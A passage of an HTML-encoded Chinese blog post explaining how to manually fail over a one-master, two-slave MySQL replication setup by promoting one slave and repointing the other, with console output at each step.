&#x6210;&#x65B0;&#x7684;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x3002;<br>&#x901A;&#x5E38;&#x6211;&#x4EEC;&#x8FD8;&#x6709;&#x5176;&#x4ED6;&#x7684;&#x65B9;&#x6848;&#x6765;&#x5B9E;&#x73B0;&#x9AD8;&#x53EF;&#x7528;&#xFF0C;&#x6BD4;&#x5982;MHA&#xFF0C;MySQL Cluster&#xFF0C;MMM&#xFF0C;&#x8FD9;&#x4E9B;&#x6682;&#x4E0D;&#x8BA8;&#x8BBA;&#x3002;</p>\n<h3 id=\"&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;\"><a href=\"#&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;\" class=\"headerlink\" title=\"&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;\"></a>&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;</h3><font style=\"color:red\">1&#x3001;&#x9996;&#x5148;&#x8981;&#x786E;&#x4FDD;&#x6240;&#x6709;&#x7684;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x90FD;&#x5DF2;&#x7ECF;&#x6267;&#x884C;&#x4E86;relay log&#x4E2D;&#x7684;&#x5168;&#x90E8;&#x66F4;&#x65B0;&#xFF0C;&#x5728;&#x6BCF;&#x4E2A;&#x4ECE;&#x5E93;&#x4E0A;&#xFF0C;&#x6267;&#x884C;stop slave io_thread&#xFF0C;&#x505C;&#x6B62;IO&#x7EBF;&#x7A0B;&#xFF0C;&#x7136;&#x540E;&#x68C0;&#x67E5;show processlist&#x7684;&#x8F93;&#x51FA;&#xFF0C;&#x76F4;&#x5230;&#x770B;&#x5230;&#x72B6;&#x6001;&#x662F;Slave has read all relay log; waiting for the slave I/O thread to update it&#xFF0C;&#x8868;&#x793A;&#x66F4;&#x65B0;&#x90FD;&#x6267;&#x884C;&#x5B8C;&#x6BD5;</font>\n\n<p>S1(&#x4ECE;&#x5E93;1&#x64CD;&#x4F5C;)&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; stop slave io_thread;</span><br><span class=\"line\">Query OK, 0 rows affected (0.06 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; show processlist\\G</span><br><span class=\"line\">*************************** 1. row ***************************</span><br><span class=\"line\">     Id: 3</span><br><span class=\"line\">   User: system user</span><br><span class=\"line\">   Host: </span><br><span class=\"line\">     db: NULL</span><br><span class=\"line\">Command: Connect</span><br><span class=\"line\">   Time: 2601</span><br><span class=\"line\">  State: Slave has <span class=\"built_in\">read</span> all relay <span class=\"built_in\">log</span>; waiting <span class=\"keyword\">for</span> the slave I/O thread to update it</span><br><span class=\"line\">   Info: NULL</span><br><span class=\"line\">*************************** 2. row ***************************</span><br><span class=\"line\">     Id: 4</span><br><span class=\"line\">   User: root</span><br><span class=\"line\">   Host: localhost</span><br><span class=\"line\">     db: NULL</span><br><span class=\"line\">Command: Query</span><br><span class=\"line\">   Time: 0</span><br><span class=\"line\">  State: NULL</span><br><span class=\"line\">   Info: show processlist</span><br><span class=\"line\">rows <span class=\"keyword\">in</span> <span class=\"built_in\">set</span> (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt;</span><br></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<p>S2(&#x4ECE;&#x5E93;2&#x64CD;&#x4F5C;)&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; stop slave io_thread; </span><br><span class=\"line\">Query OK, 0 rows affected (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; show processlist\\G</span><br><span class=\"line\">*************************** 1. row ***************************</span><br><span class=\"line\">     Id: 4</span><br><span class=\"line\">   User: system user</span><br><span class=\"line\">   Host: </span><br><span class=\"line\">     db: NULL</span><br><span class=\"line\">Command: Connect</span><br><span class=\"line\">   Time: 2721</span><br><span class=\"line\">  State: Slave has <span class=\"built_in\">read</span> all relay <span class=\"built_in\">log</span>; waiting <span class=\"keyword\">for</span> the slave I/O thread to update it</span><br><span class=\"line\">   Info: NULL</span><br><span class=\"line\">*************************** 2. row ***************************</span><br><span class=\"line\">     Id: 5</span><br><span class=\"line\">   User: root</span><br><span class=\"line\">   Host: localhost</span><br><span class=\"line\">     db: NULL</span><br><span class=\"line\">Command: Query</span><br><span class=\"line\">   Time: 0</span><br><span class=\"line\">  State: NULL</span><br><span class=\"line\">   Info: show processlist</span><br><span class=\"line\">rows <span class=\"keyword\">in</span> <span class=\"built_in\">set</span> (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt;</span><br></pre></td></tr></table></figure></p>\n<font style=\"color:red\">2&#x3001;&#x5728;&#x4ECE;&#x5E93;S1&#x4E0A;&#xFF0C;&#x6267;&#x884C;stop slave&#x505C;&#x6B62;&#x4ECE;&#x670D;&#x52A1;&#xFF0C;&#x7136;&#x540E;&#x6267;&#x884C;reset master&#x4EE5;&#x91CD;&#x7F6E;&#x6210;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x5E76;&#x4E14;&#x8FDB;&#x884C;&#x6388;&#x6743;&#x8D26;&#x53F7;&#xFF0C;&#x8BA9;S2&#xFF08;&#x4ECE;&#x5E93;2&#xFF09;&#x6709;&#x6743;&#x9650;&#x8FDB;&#x884C;&#x8FDE;&#x63A5;</font>\n\n<p>S1&#xFF08;&#x4ECE;&#x5E93;1&#x64CD;&#x4F5C;&#xFF09;&#xFF1A;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; stop slave;</span><br><span class=\"line\">Query OK, 0 rows affected (0.01 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; reset master;</span><br><span class=\"line\">Query OK, 0 rows affected (0.06 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; grant replication slave on *.* to <span class=\"string\">&apos;repl&apos;</span>@<span class=\"string\">&apos;192.168.0.100&apos;</span> identified by <span class=\"string\">&apos;123456&apos;</span>;</span><br><span class=\"line\">Query OK, 0 rows affected (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt;</span><br></pre></td></tr></table></figure>\n<font style=\"color:red\">3&#x3001;&#x5728;S2&#xFF08;&#x4ECE;&#x5E93;2&#xFF09;&#x4E0A;&#xFF0C;&#x6267;&#x884C;stop slave&#x505C;&#x6B62;&#x4ECE;&#x670D;&#x52A1;&#xFF0C;&#x7136;&#x540E;&#x6267;&#x884C;change master to master_host=&#x2019;S1&#x2019;&#x4EE5;&#x91CD;&#x65B0;&#x8BBE;&#x7F6E;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x6267;&#x884C;start slave&#x542F;&#x52A8;&#x590D;&#x5236;&#xFF1A;</font>\n\n<p>S2&#xFF08;&#x4ECE;&#x5E93;2&#x64CD;&#x4F5C;&#xFF09;&#xFF1A;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; stop slave;</span><br><span class=\"line\">Query OK, 0 rows affected (0.01 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; change master to master_host=<span class=\"string\">&apos;192.168.0.20&apos;</span>;</span><br><span class=\"line\">Query OK, 0 rows affected (0.06 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; start slave;</span><br><span class=\"line\">Query OK, 0 rows affected (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt;</span><br></pre></td></tr></table></figure>\n<font style=\"color:red\">4&#x3001;&#x67E5;&#x770B;S2&#xFF08;&#x4ECE;&#x5E93;2&#xFF09;&#x590D;&#x5236;&#x72B6;&#x6001;&#x662F;&#x5426;&#x6B63;&#x5E38;&#xFF1A;</font>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; show slave status\\G</span><br><span class=\"line\">*************************** 1. row ***************************</span><br><span class=\"line\">               Slave_IO_State: Waiting <span class=\"keyword\">for</span> master to send event</span><br><span class=\"line\">                  Master_Host: 192.168.0.20</span><br><span class=\"line\">                  Master_User: repl</span><br><span class=\"line\">                  Master_Port: 3306</span><br><span class=\"line\">                Connect_Retry: 2</span><br><span class=\"line\">              Master_Log_File: mysql-bin.000001</span><br><span class=\"line\">          Read_Master_Log_Pos: 261</span><br><span class=\"line\">               Relay_Log_File: MySQL-02-relay-bin.000002</span><br><span class=\"line\">                Relay_Log_Pos: 407</span><br><span class=\"line\">        Relay_Master_Log_File: mysql-bin.000001</span><br><span class=\"line\">             Slave_IO_Running: Yes</span><br><span class=\"line\">            Slave_SQL_Running: Yes</span><br><span class=\"line\">              Replicate_Do_DB: </span><br><span class=\"line\">          Replicate_Ignore_DB: </span><br><span class=\"line\">           Replicate_Do_Table: </span><br><span class=\"line\">       Replicate_Ignore_Table: </span><br><span class=\"line\">      Replicate_Wild_Do_Table: yayun.%</span><br><span class=\"line\">  Replicate_Wild_Ignore_Table: </span><br><span class=\"line\">                   Last_Errno: 0</span><br><span class=\"line\">                   Last_Error: </span><br><span class=\"line\">                 Skip_Counter: 0</span><br><span class=\"line\">          Exec_Master_Log_Pos: 261</span><br><span class=\"line\">              Relay_Log_Space: 566</span><br><span class=\"line\">              Until_Condition: None</span><br><span class=\"line\">               Until_Log_File: </span><br><span class=\"line\">                Until_Log_Pos: 0</span><br><span class=\"line\">           Master_SSL_Allowed: No</span><br><span class=\"line\">           Master_SSL_CA_File: </span><br><span class=\"line\">           Master_SSL_CA_Path: </span><br><span class=\"line\">              Master_SSL_Cert: </span><br><span class=\"line\">            Master_SSL_Cipher: </span><br><span class=\"line\">               Master_SSL_Key: </span><br><span class=\"line\">        Seconds_Behind_Master: 0</span><br><span class=\"line\">Master_SSL_Verify_Server_Cert: No</span><br><span class=\"line\">                Last_IO_Errno: 0</span><br><span class=\"line\">                Last_IO_Error: </span><br><span class=\"line\">               Last_SQL_Errno: 0</span><br><span class=\"line\">               Last_SQL_Error: </span><br><span class=\"line\">  Replicate_Ignore_Server_Ids: </span><br><span class=\"line\">             Master_Server_Id: 2</span><br><span class=\"line\">row <span class=\"keyword\">in</span> <span class=\"built_in\">set</span> (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt;</span><br></pre></td></tr></table></figure>\n<p>&#x67E5;&#x770B;&#x539F;&#x6765;&#x7684;&#x4ECE;&#x5E93;S1&#xFF0C;&#x73B0;&#x5728;&#x7684;&#x4E3B;&#x5E93;&#x7684;show processlist&#x60C5;&#x51B5;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; show  processlist\\G</span><br><span class=\"line\">*************************** 1. row ***************************</span><br><span class=\"line\">     Id: 4</span><br><span class=\"line\">   User: root</span><br><span class=\"line\">   Host: localhost</span><br><span class=\"line\">     db: NULL</span><br><span class=\"line\">Command: Query</span><br><span class=\"line\">   Time: 0</span><br><span class=\"line\">  State: NULL</span><br><span class=\"line\">   Info: show  processlist</span><br><span class=\"line\">*************************** 2. row ***************************</span><br><span class=\"line\">     Id: 7</span><br><span class=\"line\">   User: repl</span><br><span class=\"line\">   Host: 192.168.0.100:60235</span><br><span class=\"line\">     db: NULL</span><br><span class=\"line\">Command: Binlog Dump</span><br><span class=\"line\">   Time: 184</span><br><span class=\"line\">  State: Master has sent all binlog to slave; waiting <span class=\"keyword\">for</span> binlog to be updated</span><br><span class=\"line\">   Info: NULL</span><br><span class=\"line\">rows <span class=\"keyword\">in</span> <span class=\"built_in\">set</span> (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt;</span><br></pre></td></tr></table></figure></p>\n<font style=\"color:red\">5&#x3001;&#x901A;&#x77E5;&#x6240;&#x6709;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x5C06;&#x5E94;&#x7528;&#x6307;&#x5411;S1&#xFF08;&#x5DF2;&#x63D0;&#x5347;&#x4E3A;&#x4E3B;&#x5E93;&#xFF09;,&#x8FD9;&#x6837;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001;&#x7684;&#x6240;&#x6709;&#x7684;&#x66F4;&#x65B0;&#x53D8;&#x5316;&#x5C06;&#x8BB0;&#x5F55;&#x5230;S1&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#x3002;</font>\n\n<p><font style=\"color:red\">6&#x3001;&#x5220;&#x9664;S1&#xFF08;&#x65B0;&#x7684;&#x4E3B;&#x5E93;&#xFF09;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;master.info&#x548C;relay-log.info&#x6587;&#x4EF6;&#xFF0C;&#x5426;&#x5219;&#x4E0B;&#x6B21;&#x91CD;&#x542F;&#x65F6;&#x8FD8;&#x4F1A;&#x6309;&#x7167;&#x4ECE;&#x5E93;&#x542F;&#x52A8;&#x3002;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x8BE5;&#x53C2;&#x6570;&#xFF1A;</font><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">skip_slave_start</span><br></pre></td></tr></table></figure></p>\n<p>7&#x3001;&#x6700;&#x540E;&#xFF0C;&#x5982;&#x679C;M&#x670D;&#x52A1;&#x5668;&#x4FEE;&#x590D;&#x4EE5;&#x540E;&#xFF0C;&#x5219;&#x53EF;&#x4EE5;&#x6309;&#x7167;S2&#x7684;&#x65B9;&#x6CD5;&#x914D;&#x7F6E;&#x6210;S1&#x7684;&#x4ECE;&#x5E93;&#x3002;</p>\n<p>8&#x3001;&#x4E0A;&#x9762;&#x7684;&#x6D4B;&#x8BD5;&#x6B65;&#x9AA4;&#x4E2D;S1&#x9ED8;&#x8BA4;&#x90FD;&#x662F;&#x6253;&#x5F00;log-bin&#x9009;&#x9879;&#x7684;&#xFF0C;&#x8FD9;&#x6837;&#x91CD;&#x7F6E;&#x6210;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#x540E;&#x53EF;&#x4EE5;&#x5C06;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#x8BB0;&#x5F55;&#x4E0B;&#x6765;&#xFF0C;&#x5E76;&#x4F20;&#x9001;&#x5230;&#x5176;&#x4ED6;&#x4ECE;&#x5E93;&#xFF0C;&#x8FD9;&#x662F;&#x63D0;&#x5347;&#x4E3A;&#x4E3B;&#x5E93;&#x5FC5;&#x987B;&#x7684;&#x3002;&#x5176;&#x6B21;&#xFF0C;S1&#x6CA1;&#x6709;&#x6253;&#x5F00;log-slave-updates&#x53C2;&#x6570;&#xFF0C;&#x5426;&#x5219;&#x91CD;&#x7F6E;&#x6210;&#x4E3B;&#x5E93;&#x4EE5;&#x540E;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x5C06;&#x5DF2;&#x7ECF;&#x6267;&#x884C;&#x8FC7;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#x91CD;&#x590D;&#x4F20;&#x9001;&#x7ED9;S2&#xFF0C;&#x5BFC;&#x81F4;S2&#x540C;&#x6B65;&#x9519;&#x8BEF;&#x3002;</p>\n<hr>\n<h3 id=\"&#x76F8;&#x5173;&#x94FE;&#x63A5;\"><a href=\"#&#x76F8;&#x5173;&#x94FE;&#x63A5;\" class=\"headerlink\" title=\"&#x76F8;&#x5173;&#x94FE;&#x63A5;\"></a>&#x76F8;&#x5173;&#x94FE;&#x63A5;</h3><p>&#x4E3B;&#x4ECE;&#x5207;&#x6362;&#x811A;&#x672C;&#x53C2;&#x8003;&#x94FE;&#x63A5;&#xFF1A;<a href=\"http://blog.itpub.net/25356953/viewspace-1745534/\" target=\"_blank\" rel=\"external\">http://blog.itpub.net/25356953/viewspace-1745534/</a></p>\n","excerpt":"<p>&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x4E2D;&#xFF0C;&#x67B6;&#x6784;&#x5F88;&#x591A;&#x4E3A;&#x4E00;&#x4E3B;&#x591A;&#x4ECE;&#x3002;&#x6BD4;&#x5982;&#x4E00;&#x4E2A;&#x4E3B;&#x6570;&#x636E;&#x5E93;M&#xFF0C;&#x4E24;&#x4E2A;&#x4ECE;&#x6570;&#x636E;&#x5E93;S1&#xFF0C;S2&#x540C;&#x65F6;&#x6307;&#x5411;&#x4E3B;&#x6570;&#x636E;&#x5E93;M&#x3002;</p>\n<p>&#x5F53;&#x4E3B;&#x670D;&#x52A1;&#x5668;M&#x56E0;&#x4E3A;&#x610F;&#x5916;&#x60C5;&#x51B5;&#x5B95;&#x673A;&#xFF0C;&#x9700;&#x8981;&#x5C06;&#x5176;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#xFF08;&#x5047;&#x8BBE;&#x9009;&#x62E9;S1&#xFF09;&#x5207;&#x6362;&#x6210;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x540C;&#x65F6;&#x4FEE;&#x6539;&#x53E6;&#x4E00;&#x4E2A;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#xFF08;S2&#xFF09;&#x7684;&#x914D;&#x7F6E;&#xFF0C;&#x4F7F;&#x5176;&#x6307;&#x5411;&#x65B0;&#x7684;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#xFF08;S1&#xFF09;&#x3002;</p>\n<p>&#x6B64;&#x5916;&#x8FD8;&#x9700;&#x8981;&#x901A;&#x77E5;&#x5E94;&#x7528;&#x4FEE;&#x6539;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#x7684;IP&#x5730;&#x5740;&#xFF0C;&#x5982;&#x679C;&#x53EF;&#x80FD;&#xFF0C;&#x5C06;&#x51FA;&#x73B0;&#x6545;&#x969C;&#x7684;&#x4E3B;&#x6570;&#x636E;&#x5E93;(M)&#x4FEE;&#x590D;&#x6216;&#x8005;&#x91CD;&#x7F6E;&#x6210;&#x65B0;&#x7684;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x3002;<br>&#x901A;&#x5E38;&#x6211;&#x4EEC;&#x8FD8;&#x6709;&#x5176;&#x4ED6;&#x7684;&#x65B9;&#x6848;&#x6765;&#x5B9E;&#x73B0;&#x9AD8;&#x53EF;&#x7528;&#xFF0C;&#x6BD4;&#x5982;MHA&#xFF0C;MySQL Cluster&#xFF0C;MMM&#xFF0C;&#x8FD9;&#x4E9B;&#x6682;&#x4E0D;&#x8BA8;&#x8BBA;&#x3002;</p>\n<h3 id=\"&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;\"><a href=\"#&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;\" class=\"headerlink\" title=\"&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;\"></a>&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;</h3><font style=\"color:red\">1&#x3001;&#x9996;&#x5148;&#x8981;&#x786E;&#x4FDD;&#x6240;&#x6709;&#x7684;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x90FD;&#x5DF2;&#x7ECF;&#x6267;&#x884C;&#x4E86;relay log&#x4E2D;&#x7684;&#x5168;&#x90E8;&#x66F4;&#x65B0;&#xFF0C;&#x5728;&#x6BCF;&#x4E2A;&#x4ECE;&#x5E93;&#x4E0A;&#xFF0C;&#x6267;&#x884C;stop slave io_thread&#xFF0C;&#x505C;&#x6B62;IO&#x7EBF;&#x7A0B;&#xFF0C;&#x7136;&#x540E;&#x68C0;&#x67E5;show processlist&#x7684;&#x8F93;&#x51FA;&#xFF0C;&#x76F4;&#x5230;&#x770B;&#x5230;&#x72B6;&#x6001;&#x662F;Slave has read all relay log; waiting for the slave I/O thread to update it&#xFF0C;&#x8868;&#x793A;&#x66F4;&#x65B0;&#x90FD;&#x6267;&#x884C;&#x5B8C;&#x6BD5;</font>\n\n<p>S1(&#x4ECE;&#x5E93;1&#x64CD;&#x4F5C;)&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; stop slave io_thread;</span><br><span class=\"line\">Query OK, 0 rows affected (0.06 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; show processlist\\G</span><br><span class=\"line\">*************************** 1. row ***************************</span><br><span class=\"line\">     Id: 3</span><br><span class=\"line\">   User: system user</span><br><span class=\"line\">   Host: </span><br><span class=\"line\">     db: NULL</span><br><span class=\"line\">Command: Connect</span><br><span class=\"line\">   Time: 2601</span><br><span class=\"line\">  State: Slave has <span class=\"built_in\">read</span> all relay <span class=\"built_in\">log</span>; waiting <span class=\"keyword\">for</span> the slave I/O thread to update it</span><br><span class=\"line\">   Info: NULL</span><br><span class=\"line\">*************************** 2. row ***************************</span><br><span class=\"line\">     Id: 4</span><br><span class=\"line\">   User: root</span><br><span class=\"line\">   Host: localhost</span><br><span class=\"line\">     db: NULL</span><br><span class=\"line\">Command: Query</span><br><span class=\"line\">   Time: 0</span><br><span class=\"line\">  State: NULL</span><br><span class=\"line\">   Info: show processlist</span><br><span class=\"line\">rows <span class=\"keyword\">in</span> <span class=\"built_in\">set</span> (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt;</span><br></pre></td></tr></table></figure></p>","more":"<p>S2(&#x4ECE;&#x5E93;2&#x64CD;&#x4F5C;)&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; stop slave io_thread; </span><br><span class=\"line\">Query OK, 0 rows affected (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; show processlist\\G</span><br><span class=\"line\">*************************** 1. row ***************************</span><br><span class=\"line\">     Id: 4</span><br><span class=\"line\">   User: system user</span><br><span class=\"line\">   Host: </span><br><span class=\"line\">     db: NULL</span><br><span class=\"line\">Command: Connect</span><br><span class=\"line\">   Time: 2721</span><br><span class=\"line\">  State: Slave has <span class=\"built_in\">read</span> all relay <span class=\"built_in\">log</span>; waiting <span class=\"keyword\">for</span> the slave I/O thread to update it</span><br><span class=\"line\">   Info: NULL</span><br><span class=\"line\">*************************** 2. row ***************************</span><br><span class=\"line\">     Id: 5</span><br><span class=\"line\">   User: root</span><br><span class=\"line\">   Host: localhost</span><br><span class=\"line\">     db: NULL</span><br><span class=\"line\">Command: Query</span><br><span class=\"line\">   Time: 0</span><br><span class=\"line\">  State: NULL</span><br><span class=\"line\">   Info: show processlist</span><br><span class=\"line\">rows <span class=\"keyword\">in</span> <span class=\"built_in\">set</span> (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt;</span><br></pre></td></tr></table></figure></p>\n<font style=\"color:red\">2&#x3001;&#x5728;&#x4ECE;&#x5E93;S1&#x4E0A;&#xFF0C;&#x6267;&#x884C;stop slave&#x505C;&#x6B62;&#x4ECE;&#x670D;&#x52A1;&#xFF0C;&#x7136;&#x540E;&#x6267;&#x884C;reset master&#x4EE5;&#x91CD;&#x7F6E;&#x6210;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x5E76;&#x4E14;&#x8FDB;&#x884C;&#x6388;&#x6743;&#x8D26;&#x53F7;&#xFF0C;&#x8BA9;S2&#xFF08;&#x4ECE;&#x5E93;2&#xFF09;&#x6709;&#x6743;&#x9650;&#x8FDB;&#x884C;&#x8FDE;&#x63A5;</font>\n\n<p>S1&#xFF08;&#x4ECE;&#x5E93;1&#x64CD;&#x4F5C;&#xFF09;&#xFF1A;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; stop slave;</span><br><span class=\"line\">Query OK, 0 rows affected (0.01 sec)</span><br><span 